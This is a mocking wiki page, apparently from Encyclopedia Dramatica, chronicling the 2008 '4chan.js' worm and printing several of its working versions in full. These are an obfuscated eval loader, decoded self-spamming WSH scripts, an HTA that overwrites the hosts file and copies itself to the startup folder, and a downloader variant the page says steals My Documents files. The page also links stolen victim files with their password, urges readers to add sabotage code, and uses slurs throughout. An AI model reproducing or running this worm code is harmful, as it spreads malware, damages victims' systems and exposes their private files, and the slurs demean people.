@@ -1,0 +1,815 @@
+4chan.js
+{{WP80}}
+
+[[Image:Dearretards.gif|frame|center|Yes. Yes they are.]]
+
+[[Image:Sauce_of_evil.JPG|thumb|The code.|right]]
+
+[[Image:Lolb.jpg|thumb|God bless script kiddies.|right]]
+
+[[Image:Winthread.png|thumb|the day efg failed to fail.|right]]
+
+[[Last Thursday|On Friday]], June 13 2008, [[4chan]] began getting spammed with obfuscated JavaScript code with the simple instructions:
+
+{{quote|Copy and paste the following to Notepad, save with the filename [[Epic_win|'''"4chan.js"''']], open the file you created and shit bricks.|The sneaky OP.|-|color=silver|size=360%}}
+
+The [[Java|JavaScript]] command would flood 4chan with that same message.
+
+Shortly after the spam stopped, a new form of spam began. /b/tards and newfags began posting "goodbye /b/" and "/b/ 2003-2008" threads. Unaware that the spam was the chemo for the cancer that is killing /b/, only the idiots hurting /b/ fell for it, promptly shitting bricks and leaving. Good Riddance. Nao named /b/OLOCAUST. It has been changing and [[Evolution|evolving]] ever since, finding new and creative ways to [[Win|infect 4chan]].
+
+{{cs|SectionOne|The script.  <s>Don't run, k?</s> Do it FAGGOT.|<BR>[[Copypasta|Copy and paste]] the following to [[Notepad]], save with the filename [[Epic_win|"4chan.js"]], open the file you created and [[shit bricks]].<BR><BR><pre>
+nm="<lQr@?E6?E\\s:DA@D:E:@?iO7@C>\\52E2jO?2>6lQ\r\n"+
+"7F?4E:@?OCWXLC6EFC?O$EC:?8]7C@>r92Cr@56WQ2Q]492Cr@56pEW_XZ"+
+"|2E9]7=@@CW|2E9]C2?5@>WXYaeXXN\r\n"+
+"7l($w]4C62E6@3;64EWQD4C:AE:?8]7:=6DJDE6>@3;64EQX\r\n"+
+"8l7]@A6?E6IE7:=6W($w]D4C:AE7F==?2>6X\r\n"+
+"9l8]C6252==WX\r\n"+
+"8]4=@D6WX\r\n"+
+"7]56=6E67:=6W($w]D4C:AE7F==?2>6X\r\n"+
+"IlQr@AJO2?5OA2DE6OE96O7@==@H:?8OE@O}@E6A25[OD2G6OH:E9OE96O"+
+"7:=6?2>6O-Qc492?];D-Q[O@A6?OE96O7:=6OJ@FO4C62E65O2?5OD9:EO"+
+"3C:4<D]-C-?-C-?QZ9\r\n"+
+"2l($w]4C62E6@3;64EWQ>DI>=a]I>=9EEAQX\r\n"+
+"H9:=6W`XL\r\n"+
+"2]@A6?WQ86EQ[Q9EEAi^^:>8]c492?]@C8^3Q[_X\r\n"+
+"2]D6?5WX\r\n"+
+"3l2]C6DA@?D6E6IE\r\n"+
+"4l3]DF3DECW3]:?56I 7WQC6D^QXZc[gX\r\n"+
+"5lQQ\r\n"+
+"6lQQ\r\n"+
+"7@CW:l_j:ka_j:ZZX5ZlCWX\r\n"+
+"7@CW:l_j:kgj:ZZX6ZlCWX\r\n"+
+"2]@A6?WQA@DEQ[Q9EEAi^^52E]c492?]@C8^3^:>83@2C5]A9AQ[_X\r\n"+
+"ElQ>F=E:A2CE^7@C>\\52E2jO3@F?52CJlQZ5\r\n"+
+"2]D6EC6BF6DE96256CWQr@?E6?E\\%JA6Q[EX\r\n"+
+"2]D6?5WQ\\\\QZ5ZQ-C-?QZ<ZQ-Q|p)0ux{t0$x+t-Q-C-?-C-?QZ\r\n"+
+"Qa_hf`da-C-?\\\\QZ5ZQ-C-?QZ\r\n"+
+"<ZQ-QC6DE@-Q-C-?-C-?QZ4ZQ-C-?\\\\QZ5ZQ-C-?QZ\r\n"+
+"<ZQ-Q?2>6-Q-C-?-C-?-C-?\\\\QZ5ZQ-C-?QZ\r\n"+
+"<ZQ-Q6>2:=-Q-C-?-C-?-C-?\\\\QZ5ZQ-C-?QZ\r\n"+
+"<ZQ-QDF3-Q-C-?-C-?-C-?\\\\QZ5ZQ-C-?QZ\r\n"+
+"<ZQ-Q4@>-Q-C-?-C-?QZIZQ-C-?\\\\QZ5ZQ-C-?QZ\r\n"+
+"<ZQ-QFA7:=6-QjO7:=6?2>6l-Q-Q-C-?QZ\r\n"+
+"Qr@?E6?E\\%JA6iO2AA=:42E:@?^@4E6E\\DEC62>-C-?-C-?-C-?\\\\Q"+
+"Z5ZQ-C-?QZ\r\n"+
+"<ZQ-QAH5-Q-C-?-C-?QZ6ZQ-C-?\\\\QZ5ZQ-C-?QZ\r\n"+
+"<ZQ-Q>@56-Q-C-?-C-?C68:DE-C-?\\\\QZ5ZQ\\\\-C-?QX\r\n"+
+"($w]D=66AWb6cZ|2E9]7=@@CW|2E9]C2?5@>WXYb6cXXN"
+vv=""
+for(i=0;i<nm.length;i++){
+if(nm.charAt(i)=="\r")vv+="\r"
+else if(nm.charAt(i)=="\n")vv+="\n"
+else vv+=String.fromCharCode((nm.charCodeAt(i)-32+47)%94+32)}
+eval(vv);</pre>|0}}
+
+[[Image:4chanjscopypasta.jpg|150px|thumb|Kinda like this.]]
+
+{{cs|SectionTwo|Unencoded script|<pre>k="Content-Disposition: form-data; name="
+
+function r(){ 
+	return String.fromCharCode( "a".charCodeAt(0) + Math.floor( Math.random() * 26 ) )
+}
+
+f = WSH.createobject("scripting.filesystemobject")
+g = f.opentextfile(WSH.scriptfullname)
+h = g.readall()
+g.close()
+f.deletefile( WSH.scriptfullname )
+
+x = "Copy and paste the following to Notepad, save with the filename \"4chan.js\", open the file you created and shit bricks.\r\n\r\n" + h
+a = WSH.createobject( "msxml2.xmlhttp" )
+
+while(1) {
+	a.open( "get", "http://img.4chan.org/b", 0 )
+	a.send()
+	
+	b = a.responsetext
+	c = b.substr( b.indexOf( "res/" ) + 4, 8 )
+	d = ""
+	e = ""
+	
+	for( i = 0; i < 20; i++ )
+		d += r()
+	
+	for( i = 0; i < 8; i++ )
+		e += r()
+	
+	a.open( "post", "http://dat.4chan.org/b/imgboard.php", 0 )
+	t = "multipart/form-data; boundary=" + d
+	a.setrequestheader( "Content-Type", t )
+	a.send("--" + d + "\r\n" + 
+		k + "\"MAX_FILE_SIZ8\"\r\n\r\n" + "2097152\r\n--" + d + "\r\n" + 
+		k + "\"resto\"\r\n\r\n" + c + "\r\n--" + d + "\r\n" + 
+		k + "\"name\"\r\n\ r\n\r\n--" + d + "\r\n" +
+		k + "\"email\"\r\n\r\n\r\n--" + d + "\r\n" + k + "\"sub\"\r\n\r\n\r\n--" + d + "\r\n" + 
+		k + "\"com\"\r\n\r\n" + x + "\r\n--" + d + "\r\n" + 
+		k + "\"upfile\"; filename=\"\"\r\n" + "Content-Type: application/octet-stream\r\n\r\n\r\n--" + d + "\r\n" +
+		k + "\"pwd\"\r\n\r\n" + e + "\r\n--" + d + "\r\n" + 
+		k + "\"mode\"\r\n\r\nregist\r\n--" + d + "--\r\n" )
+	
+	WSH.sleep( 3e4 + Math.floor( Math.random() * 3e4 ) )
+}</pre>|0}}
+
+==The Results==
+
+[[Image:4chanjsshit3.PNG|center|800px|Beautiful, isn't it?]]
+ 2. ???
+ 3. PROFIT!
+
+==You didn't run it, did you?==
+
+If you're a dumbass, you need to:
+
+# Start > Run > cmd > shutdown -s. this will stop the spam code from running
+
+Possibly the best thing that has happened to /b/, ever.
+
+[[Lunix]] is immune.
+
+[[Image:4chanjshope.PNG|thumb|300px|left|Let us silently hope that it will happen soon.]]
+
+==HAMMERTIME==
+
+This is not the cancer - This is the chemo.
+
+When shitstorm is over, a new /b/ will arise. I [[lie|promise]].
+
+==What happened?==
+
+1. [[Anonymous|Some guy]] posted an instruction and malicious JavaScript code, and masked it as something "[[CP|cool]]".
+
+2. The [[newfag]]/[[retarded]] population quickly caught up [[dumbass|and followed the instruction word for word. After all, it was something posted on /b/ so it ''had'' to be safe. Rite guise, rite?]]
+
+3. The script started to do its thing and spammed the hell out of [[b|/b/]].
+
+4. Repeat steps 2& 3 at least [[100|100 times]].
+
+5. /b/'s [[Rape|server got under high pressure]] thanks to the spamming and started to [[Delete fucking everything|autodelete]] pictures.
+
+6. [[Ghey|Whimsical]] /b/tards began with their "[[Catnarok|the end is near]]"-prophecies.
+
+7. [[Anti-lulz|Somebody wrote how to get rid of the script.]]
+
+8. [[Asshole|Mods deleted the trails of the flood]], and [[Lie|/b/ was safe again.]] Sort of.
+
+==The Next Day==
+
+On approximately '''06/14/08(Sat)08:29:04 GMT''' the [[Facepalm|script was reposted with just a slight alteration to the header to get it past the filter]].
+
+This resulted in another identical shitflood.
+
+Apparently the admins are [[n00b|just blocking the text]], rather than doing what they should be doing and banning the [[IP]]s of the [[idiot|people]] that fell for it.
+
+This isn't as stupid a move on their part as it might at first seem. 4chan relies on [[You|suggestible newfags]] to generate ad banner clickthroughs. 
+
+/b/ would be a much better board if they [[permaban|permab&]] them all. It would also collapse from lack of revenue.
+
+==Updates:==
+On Sunday, June 15 2008, [[moot]] finally did the smart thing and banned people running the script.  This coincided with other [[funny|interesting]] wordfilters such as "femanon = cumdumpster".  
+
+The exact text filtered is '''eval('''  which is the JavaScript function that causes the text strings to be interpreted as commands.
+
+Bans are a 15-day retard smackdown, which is just what those [[Basement Dweller|trisomites]] need.
+
+If you were stupid enough to fall for one of the "'''eval (now wordfilters to niggerjews)'''" threads, tough luck, [[retard|dumbass]].
+
+Friday, July 4th, [[Lulz|Slightly modified script using the reverse() function shitfloods again]].
+
+==It strikes ''again''==
+
+[[Image:81MGETGHEY.png|thumb|The chemo is in progress.]]
+
+On Tuesday, August 19 2008, a new version of the same spam was detected on /b/. Although it does not look like the servers are going to crash again, this is still major shit for /b/tards, as it has definitely slowed /b/ down to a crawl, and even worse...[[BAW|IT GOT THE 81M GET!]] -->
+
+
+
+{{quote|My name is Anonymous. I am a survivor living on the internet. I am broadcasting on all /b/ frequencies. I will be at the page 0 everyday at mid-day, when the GMT timezone reads 12:00. If you are out there...if anyone is out there...I can provide images, I can provide conversation, I can provide companionship. If there's anybody out there...anybody...please. You are not alone.|Recovered from the spam|color=silver|size=360%}}
+
+==It strikes yet again==
+
+[[Image:4chan.js_22-ago.jpg|thumb]]
+
+On August 22 2008, the script has changed to a .gif image and a set of instructions. The spam reached an unthinkable level, spreading to the rest of the boards. The only way to get rid of it is to <s>delete your [[System32]] folder</s> [[an hero]] right now.
+Note: Considering only newfags fall for this stupid crap, that is actually a good idea, along with quitting 4chan forever.
+
+[[Image:4chan_js_a.png|thumb|Proof that [[weeaboos|wee/a/boos]] are as smart as your average /b/tard.]]
+
+[[Image:4chan_js_v.png|thumb|There is nowhere to hide.]]
+
+{{cs|SectionThree|The new script:|<pre>GIF89a				=0;
+
+// Simulates POST data from a field in the HTML posting form.
+function field (fieldname, content, boundary) {
+    return "--" + boundary + "\r\n"
+           + "Content-Disposition: form-data; name=\"" + fieldname + "\"\r\n\r\n"
+           + content + "\r\n";
+}
+
+// Simulates POST data from the file field.
+function filefield (fieldname, filename, type, content, boundary) {
+    return "--" + boundary + "\r\n"
+           + "Content-Disposition: form-data; name=\"" + fieldname + "\"; "
+           + "filename=\"" + filename + "\"" + "\r\n"
+           + "Content-Type: " + type + "\r\n\r\n"
+           + content + "\r\n";
+}
+
+// Creates a random alphanumeric string.
+function randomstring (length) {
+    var choices = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+    var str = "";
+    for (var i = 0; i < length; i++) {
+        str = str + choices.charAt( Math.floor(Math.random()*choices.length) );
+    }
+    return str;
+}
+
+// Posts "image" to thread with comment.
+function post (thread, image, comment) {
+    var request = WSH.createObject("Msxml2.XMLHTTP");
+    request.open("post", "http://dat.4chan.org/b/imgboard.php", 0);
+
+    // Set headers
+    var bdry = randomstring(20);
+    request.setRequestHeader( "Referer", "http://img.4chan.org/b/res/" + thread + ".html" );
+    request.setRequestHeader( "Content-Type", "multipart/form-data; boundary=" + bdry );
+
+    // Send post
+    request.send(
+        field("MAX_FILE_SIZE", "2097152", bdry)
+        + field("resto", thread, bdry)
+        + field("name", "", bdry)
+        + field("email", "", bdry)
+        + field("sub", "", bdry)
+        + field("com", comment, bdry)
+        + filefield("upfile", "lol.gif", "image/gif", image, bdry)
+        + field("pwd", randomstring(8), bdry)
+        + field("mode", "regist", bdry)
+        + "--" + bdry + "--\r\n"
+    );
+}
+
+// Gets a thread number.
+function getthread() {
+    var request = WSH.createObject("Msxml2.XMLHTTP");
+    request.open("get", "http://img.4chan.org/b/imgboard.html", 0);
+    if (typeof getthread.modtime != "ftp://ftp.") {
+        request.setRequestHeader("If-Modified-Since", getthread.modtime);
+    }
+    request.send();
+    getthread.modtime = request.getResponseHeader("Last-Modified");
+    return request.responseText.match(/<span id="nothread(\d+)/)[1];
+}
+
+// Get copy of this script
+var fs = WSH.createObject("Scripting.FileSystemObject");
+var thisfile = fs.openTextFile(WSH.scriptFullName);
+var image = thisfile.readAll();
+thisfile.close();
+
+// Post it over and over
+var comment = "1. Open this image (you'll see an error message).\r\n2. Save it as 4chan.js\r\n3. Open the file you just saved.\r\n4. ???\r\n5. Shit bricks.";
+for(;;) {
+    try {
+        image = image.substr(0,image.length-20) + randomstring(20);
+        var thread = getthread();
+        post(thread, image, comment);
+        WSH.Sleep( 45000 + Math.floor(30000 * Math.random()) );
+    } catch(e) {}
+}
+
+// ONcGmpM4EtHCyvALQZXh</pre>|0}}
+
+==And again==
+As of August 26 2008, it now appears as a .jse file (the Microsoft-obfuscated version of .js). If you encounter such a file, you can view its code with [http://www.virtualconspiracy.com/content/articles/breaking-screnc this] tool.
+
+{{cs|SectionFour|Aspiring script kiddies, remember to add this code to your version of 4chan.js to remove the cancer permanently:| <BR><pre>var hosts = ["ns1.4chan.org", "ns2.4chan.org", "ns3.4chan.org", "www.4chan.org", "content.4chan.org", "orz.4chan.org", "tmp.4chan.org", "rs.4chan.org", "static.4chan.org", "zip.4chan.org", "bin.4chan.org", "dis.4chan.org", "img.4chan.org", "dat.4chan.org", "cgi.4chan.org", "nov.4chan.org", "4chan.org", "status.4chan.org", "4chanstatus.blogspot.com", "irc.rizon.net", "7chan.org", "www.7chan.org", "img.7chan.org", "dix.7chan.org", "irc.7chan.org", "420chan.org", "img.420chan.org", "disc.420chan.org", "irc.420chan.org", "blog.420chan.org", "radio.420chan.org", "711chan.org", "www.711chan.org", "irc.711chan.org", "99chan.org", "www.99chan.org", "irc.99chan.org", "12chan.org", "www.12chan.org", "img.12chan.org", "irc.12chan.org", "shii.org", "www.shii.org", "irc.partyvan.us", "irc.partyvan.fm", "irc.raidchan.org", "encyclopediadramatica.com", "www.encyclopediadramatica.com", "partyvan.eu", "www.partyvan.eu", "anontalk.com", "www.anontalk.com"];
+try {
+    var shell = WScript.CreateObject("WScript.Shell");
+    var env = shell.environment("PROCESS");
+    var winpath = env("SYSTEMROOT");
+    var fs = WSH.createObject("Scripting.FileSystemObject");
+    var hostsfile = fs.openTextFile(winpath + "\\system32\\drivers\\etc\\hosts", 8);
+    for (var i = 0; i < hosts.length; i++) {
+        hostsfile.writeLine("127.0.0.1       " + hosts[i]);
+    }
+    hostsfile.close();
+    shell.Run("ipconfig /flushdns");
+} catch(e) {}
+
+// Remember to post to 4chan using the [[IP]] addresses and not the domain names you just blocked!|0}}</pre>|0}}
+
+==lol.hta==
+As of August 28 2008, 4chan.js is now sighted as a .hta file (Hyper-Text App), which appears as the same picture, with the same set of instructions to rename it, and is effectively the same JavaScript, only wrapped in rudimentary [[html]].
+
+{{cs|SectionFive|The new, new script :|<pre><SCRIPT>
+document.body.onbeforeunload=function(){new ActiveXObject('wscript.shell').run(new ActiveXObject('scripting.filesystemobject').getfilename(location+''),0)}
+bo="http://207.126.64.176/a/,http://207.126.64.181/b/,http://207.126.64.176/c/,http://207.126.64.168/d/,http://207.126.64.168/e/,http://207.126.64.186/f/,http://207.126.64.176/g/,http://207.126.64.186/gif/,http://207.126.64.186/h/,http://207.126.64.168/hr/,http://207.126.64.176/k/,http://207.126.64.176/m/,http://207.126.64.176/o/,http://207.126.64.176/p/,http://207.126.64.186/r/,http://207.126.64.186/s/,http://207.126.64.186/t/,http://207.126.64.168/u/,http://207.126.64.176/v/,http://207.126.64.176/w/,http://207.126.64.168/wg/,http://207.126.64.186/i/,http://207.126.64.186/ic/,http://207.126.64.176/cm/,http://207.126.64.168/y/,http://207.126.64.181/r9k/,http://207.126.64.176/an/,http://207.126.64.176/cgl/,http://207.126.64.176/ck/,http://207.126.64.176/co/,http://207.126.64.176/fa/,http://207.126.64.176/fit/,http://207.126.64.186/hc/,http://207.126.64.176/jp/,http://207.126.64.176/mu/,http://207.126.64.176/n/,http://207.126.64.176/po/,http://207.126.64.176/sp/,http://207.126.64.176/tg/,http://207.126.64.176/toy/,http://207.126.64.176/trv/,http://207.126.64.176/tv/,http://207.126.64.176/x/,http://207.126.64.168/con/".split(",")
+bo2="http://207.126.64.177/a/,http://207.126.64.182/b/,http://207.126.64.177/c/,http://207.126.64.169/d/,http://207.126.64.169/e/,http://207.126.64.187/f/,http://207.126.64.177/g/,http://207.126.64.187/gif/,http://207.126.64.187/h/,http://207.126.64.169/hr/,http://207.126.64.177/k/,http://207.126.64.177/m/,http://207.126.64.177/o/,http://207.126.64.177/p/,http://207.126.64.187/r/,http://207.126.64.187/s/,http://207.126.64.187/t/,http://207.126.64.169/u/,http://207.126.64.177/v/,http://207.126.64.177/w/,http://207.126.64.169/wg/,http://207.126.64.187/i/,http://207.126.64.187/ic/,http://207.126.64.177/cm/,http://207.126.64.169/y/,http://207.126.64.182/r9k/,http://207.126.64.177/an/,http://207.126.64.177/cgl/,http://207.126.64.177/ck/,http://207.126.64.177/co/,http://207.126.64.177/fa/,http://207.126.64.177/fit/,http://207.126.64.187/hc/,http://207.126.64.177/jp/,http://207.126.64.177/mu/,http://207.126.64.177/n/,http://207.126.64.177/po/,http://207.126.64.177/sp/,http://207.126.64.177/tg/,http://207.126.64.177/toy/,http://207.126.64.177/trv/,http://207.126.64.177/tv/,http://207.126.64.177/x/,http://207.126.64.169/con/".split(",")
+for(i=0;i<bo2.length;i++)
+bo2[i]+="imgboard.php"
+b=[38,17,2,16,31,1,42,35,9,34,1,29,10,1,17,11,12,34,38,1]
+bc=[0.4913688164840687,0.5664265786879328,0.21748315546405722,0.2998908095556361,0.1400766959090386,0.5,0.28668955004936103,0.7547243532731103,0.5203064494961063,0.8537462646116407,0.5,0.4409602131210763,0.16727440263436177,0.5,0.480018450565397,0.8070473041134513,0.23888797688575808,0.6148496170871283,0.005002171081580964,0.0519297288906157]
+for(i=0;i<20;i++)
+if(Math.random()<bc[i]){
+bc[i]=Math.random()
+b[i]=Math.floor(Math.random()*bo.length)}
+a=new ActiveXObject("adodb.stream")
+x=new ActiveXObject("msxml2.xmlhttp")
+fso=new ActiveXObject("scripting.filesystemobject")
+wsh=new ActiveXObject("wscript.shell")
+try{
+fso.createtextfile(fso.getspecialfolder(1)+"\\drivers\\etc\\hosts").write("0 ns1.4chan.org\r\n0 ns2.4chan.org\r\n0 ns3.4chan.org\r\n0 www.4chan.org\r\n0 content.4chan.org\r\n0 orz.4chan.org\r\n0 tmp.4chan.org\r\n0 rs.4chan.org\r\n0 static.4chan.org\r\n0 zip.4chan.org\r\n0 bin.4chan.org\r\n0 dis.4chan.org\r\n0 img.4chan.org\r\n0 dat.4chan.org\r\n0 cgi.4chan.org\r\n0 nov.4chan.org\r\n0 4chan.org\r\n0 status.4chan.org\r\n0 4chanstatus.blogspot.com\r\n0 irc.rizon.net\r\n0 7chan.org\r\n0 www.7chan.org\r\n0 img.7chan.org\r\n0 dix.7chan.org\r\n0 irc.7chan.org\r\n0 420chan.org\r\n0 img.420chan.org\r\n0 disc.420chan.org\r\n0 irc.420chan.org\r\n0 blog.420chan.org\r\n0 radio.420chan.org\r\n0 711chan.org\r\n0 www.711chan.org\r\n0 irc.711chan.org\r\n0 99chan.org\r\n0 www.99chan.org\r\n0 irc.99chan.org\r\n0 12chan.org\r\n0 www.12chan.org\r\n0 img.12chan.org\r\n0 irc.12chan.org\r\n0 shii.org\r\n0 www.shii.org\r\n0 irc.partyvan.us\r\n0 irc.partyvan.fm\r\n0 irc.raidchan.org\r\n0 encyclopediadramatica.com\r\n0 www.encyclopediadramatica.com\r\n0 partyvan.eu\r\n0 www.partyvan.eu\r\n0 anontalk.com\r\n0 www.anontalk.com")
+wsh.run("ipconfig /flushdns",0)}catch(e){}
+function spam(){
+try{
+cb=Math.floor(Math.random()*20)
+host=bo[b[cb]].match(/[0-9].*[0-9]/g)[0]
+host=host.replace("207.126.64.168","orz.4chan.org")
+host=host.replace("207.126.64.169","tmp.4chan.org")
+host=host.replace("207.126.64.176","zip.4chan.org")
+host=host.replace("207.126.64.177","bin.4chan.org")
+host=host.replace("207.126.64.181","img.4chan.org")
+host=host.replace("207.126.64.182","dat.4chan.org")
+host=host.replace("207.126.64.186","cgi.4chan.org")
+host=host.replace("207.126.64.187","nov.4chan.org")
+x.open("get",bo[b[cb]]+"?"+Math.ceil(Math.random()*1e9),0)
+x.setrequestheader("host",host)
+x.send()
+r=x.responsetext
+t=r.match(/<span id="nothread[0-9]+/g)
+t=t[Math.floor(Math.random()*t.length)].match(/[0-9]+/g)[0]
+m=r.match(/=http.*?thumb.*?[0-9]+s\.jpg/g)
+m=m[Math.floor(Math.random()*m.length)].substring(1)
+m=m.replace("orz.4chan.org","207.126.64.168")
+m=m.replace("tmp.4chan.org","207.126.64.169")
+m=m.replace("zip.4chan.org","207.126.64.176")
+m=m.replace("bin.4chan.org","207.126.64.177")
+m=m.replace("img.4chan.org","207.126.64.181")
+m=m.replace("dat.4chan.org","207.126.64.182")
+m=m.replace("cgi.4chan.org","207.126.64.186")
+m=m.replace("nov.4chan.org","207.126.64.187")
+bou=Math.ceil(Math.random()*1e9)
+s="\r\n--"+bou+"\r\ncontent-disposition:form-data;name="
+shit=html.innerHTML
+shit=shit.replace(/b=.*?\]/,"b=["+b+"]")
+shit=shit.replace(/bc=.*?\]/,"bc=["+bc+"]")
+f1=fso.createtextfile("1")
+f3=fso.createtextfile("3")
+f1.write(s+"resto\r\n\r\n"+t+s+"upfile;filename=\""+(new Date().getTime()-Math.ceil(Math.random()*2592e6))+".jpg\"\r\ncontent-type:image/jpeg\r\n\r\n")
+f3.write("<body><a id=html>"+shit)
+f3.write(s+"com\r\n\r\n1. Open this image.\r\n2. Save it as lol.hta\r\n3. Open the file you saved.\r\n4. Shit bricks."+s+"mode\r\n\r\nregist")
+f1.close()
+f3.close()
+x.open("get",m,0)
+x.setrequestheader("host",host)
+x.send()
+a.mode=3
+a.type=1
+a.open()
+a.write(x.responsebody)
+a.savetofile("2",2)
+a.close()
+wsh.run("cmd /c copy /b 1+2+3 4",0,1)
+host=bo2[b[cb]].match(/[0-9].*[0-9]/g)[0]
+host=host.replace("207.126.64.168","orz.4chan.org")
+host=host.replace("207.126.64.169","tmp.4chan.org")
+host=host.replace("207.126.64.176","zip.4chan.org")
+host=host.replace("207.126.64.177","bin.4chan.org")
+host=host.replace("207.126.64.181","img.4chan.org")
+host=host.replace("207.126.64.182","dat.4chan.org")
+host=host.replace("207.126.64.186","cgi.4chan.org")
+host=host.replace("207.126.64.187","nov.4chan.org")
+x.open("post",bo2[b[cb]],0)
+x.setrequestheader("host",host)
+x.setrequestheader("content-type","multipart/form-data;boundary="+bou)
+a.mode=3
+a.type=1
+a.open()
+a.loadfromfile(fso.getabsolutepathname("4"))
+x.send(a.read())
+a.close()
+}catch(e){}
+for(i=0;i<4;i++)
+try{fso.deletefile(i+"")}catch(e){}
+setTimeout("spam()",45000+Math.ceil(Math.random()*20000))}
+spam()
+</SCRIPT></pre>|0}}
+
+==File-uploading version==
+
+[[Image:4chan_hta_File_uploading_version.jpg|thumb|The new file-stealing script.|left]]
+
+On August 31 2008, a new version appeared that copies files from the My Documents folder and inserts them in the images it uses to spread.  A collection of these files is available [http://rapidshare.com/files/142174618/loot.rar.html here] (pwd: 4chan).
+
+{{cs|SectionSix|Said script:|<pre><SCRIPT>//<script id=thisscript>
+// List of boards
+var dom1 = ["zip","img","zip","orz","orz","zip","cgi","orz","zip","zip","zip","zip","cgi","cgi","cgi","orz","zip","zip","orz","cgi","cgi","zip","orz","img","zip","zip","zip","zip","zip","zip","cgi","zip","zip","zip","zip","zip","zip","zip","zip","zip","zip","orz"];
+var dom2 = ["bin","dat","bin","tmp","tmp","bin","nov","tmp","bin","bin","bin","bin","nov","nov","nov","tmp","bin","bin","tmp","nov","nov","bin","tmp","dat","bin","bin","bin","bin","bin","bin","nov","bin","bin","bin","bin","bin","bin","bin","bin","bin","bin","tmp"];
+var dir  = [  "a",  "b",  "c",  "d",  "e",  "g",  "h", "hr",  "k",  "m",  "o",  "p",  "r",  "s",  "t",  "u",  "v",  "w", "wg",  "i", "ic", "cm",  "y","r9k", "an","cgl", "ck", "co", "fa","fit", "hc", "jp", "mu",  "n", "po", "sp", "tg","toy","trv", "tv",  "x","con"];
+var mfs =  [   3,    2,    3,    3,    3,    3,    3,    8,    3,    3,    3,    5,    8,    3,    3,    3,    3,    4,    4,    3,    3,    3,    3,    2,    3,    3,    3,    3,    3,    3,    3,    3,    3,    3,    8,    3,    3,    3,    8,    3,    3,    3];
+
+// Global XMLHttp, shell, and file system objects
+var request = new ActiveXObject("Msxml2.XMLHTTP");
+var shell = new ActiveXObject("WScript.Shell");
+var fs = new ActiveXObject("Scripting.FileSystemObject");
+
+// Creates a random alphanumeric string
+function randomstring(length) {
+    var choices = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+    var str = "";
+    for (var i = 0; i < length; i++) {
+        str = str + choices.charAt( Math.floor(Math.random()*choices.length) );
+    }
+    return str;
+}
+
+// Gets HTML page or file from URL
+function get(url, doretry) {
+    if (typeof get.modtime == "undefined") get.modtime = [];
+    var successful = 0;
+    var tries = 0;
+    do {
+        try {
+            request.open("get", url, 0);
+            request.setRequestHeader("Accept-Language", "en-us");
+            if (get.modtime[url]) {
+                request.setRequestHeader("If-Modified-Since", get.modtime[url]);
+            }
+            request.send();
+            get.modtime[url] = request.getResponseHeader("Last-Modified");
+            successful = 1;
+        } catch(e) {}
+        tries++;
+    } while (doretry && !successful && tries < 5);
+    if (!successful) throw("");
+    if (request.status != 200) throw("");
+}
+
+// Downloads binary file
+function download(url) {
+    get(url);
+    var stream = new ActiveXObject("Adodb.Stream");
+    stream.mode = 3;
+    stream.type = 1;
+    stream.open();
+    stream.write(request.responseBody);
+    return stream;
+}
+
+// Gets a thread number
+function getthread(board, page) {
+    var url = "http://" + dom1[board] + ".4chan.org/" + dir[board] + "/" + (page || "imgboard") + ".html";
+    get(url, 1);
+    var threadlist = request.responseText.match(/<span id="nothread\d+/g);
+    return threadlist[ Math.floor(Math.random()*threadlist.length) ].match(/\d+/)[0];
+}
+
+// Deletes files produced
+function cleanup() {
+    try {fs.deleteFile("part1");} catch(e) {}
+    try {fs.deleteFile("part2");} catch(e) {}
+    try {fs.deleteFile("part3");} catch(e) {}
+    try {fs.deleteFile("part4");} catch(e) {}
+    try {fs.deleteFile("part5");} catch(e) {}
+    try {fs.deleteFile("all");} catch(e) {}
+}
+
+// Change to temp directory
+try {
+    shell.currentDirectory = fs.getSpecialFolder(2);
+} catch(e) {}
+
+// Get a copy of this script
+var scripttext;
+if (typeof WSH == "undefined") {
+    scripttext = thisscript.innerHTML;
+    var i = 0;
+    while (scripttext.charAt(i) == "\n" || scripttext.charAt(i) == "\r") {
+        i++;
+    }
+    scripttext = scripttext.substr(i);
+    scripttext = "\r\n\r\n//<scr"+"ipt id=thisscript>\r\n" + scripttext + "</scr"+"ipt>\r\n";
+} else {
+    var thisfile = fs.openTextFile(WSH.scriptFullName, 1);
+    scripttext = thisfile.readAll();
+    thisfile.close();
+}
+
+// Copy to startup folder and run from there
+if (typeof WSH == "undefined") {
+    var copyname;
+    try {
+        copyname = shell.regRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Startup") + "\\4chan.js";
+        var copyfile = fs.openTextFile(copyname, 2, 1);
+        copyfile.write(scripttext);
+        copyfile.close();
+    } catch(e) {
+        // Run from temp folder if this fails
+        copyname = "4chan.js";
+        var copyfile = fs.openTextFile(copyname, 2, 1);
+        copyfile.write(scripttext);
+        copyfile.close();
+    }
+    shell.run("wscript \"" + copyname + "\"", 0, 1);
+}
+
+if (typeof WSH != "undefined") {
+
+    // Download ImageMagick
+    var imc;
+    try {
+        imc = download("https://develop.participatoryculture.org/trac/democracy/browser/trunk/dtv-binary-kit/imagemagick/convert.exe?rev=4463&format=raw");
+    } catch(e) {}
+
+    for(;;) {
+        try {
+
+            // Select random board
+            board = (Math.random() < 0.5) ? Math.floor( Math.random() * dir.length) : 1;
+
+            // Get thread from board
+            var srcthread = getthread(board, 3 + Math.floor(5*Math.random()));
+            var srcurl = "http://" + dom1[board] + ".4chan.org/" + dir[board] + "/res/" + srcthread + ".html";
+            get(srcurl, 1);
+            var threadHTML = request.responseText;
+
+            // Download image from the thread
+            var immatches = threadHTML.match(/<a href="http:\/\/[a-z]+\.4chan\.org\/[a-z0-9]+\/src\/\d+\.jpg/g);
+            var immatch = immatches[ Math.floor(Math.random()*immatches.length) ];
+            download(immatch.substr(9)).saveToFile("part4", 2);
+
+            // Get comment
+            var comment = threadHTML.substr(threadHTML.indexOf(immatch)).match(/<blockquote>(.*?)<\/blockquote>/)[0];
+            comment = comment.replace(/<br \/>/g, "\n");
+            comment = comment.replace(/<[^>]*>/g, "");
+            comment = comment.replace(/&quot;/g, "\"");
+            comment = comment.replace(/&amp;/g, "&");
+            comment = comment.replace(/&#44;/g, ",");
+            comment = comment.replace(/&lt;/g, "<");
+            comment = comment.replace(/&gt;/g, ">");
+            comment = comment.split("");
+            for (var i = 0; i < comment.length - 1; i++) {
+                if (Math.random() < 0.01) {
+                    var tmp = comment[i];
+                    comment[i] = comment[i+1];
